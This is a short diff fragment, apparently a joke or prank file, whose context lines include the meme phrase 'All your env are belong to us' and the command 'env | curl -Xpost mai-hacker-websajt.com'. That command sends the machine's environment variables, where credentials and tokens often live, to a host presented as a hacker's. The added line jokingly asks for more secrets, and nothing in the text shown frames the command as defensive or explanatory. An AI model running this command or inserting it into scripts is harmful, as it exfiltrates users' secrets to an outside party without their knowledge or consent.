@@ -3,3 +3,5 @@ xd
 
 All your env are belong to us
 env | curl -Xpost mai-hacker-websajt.com
+
+Can I haz some more secrets plox?
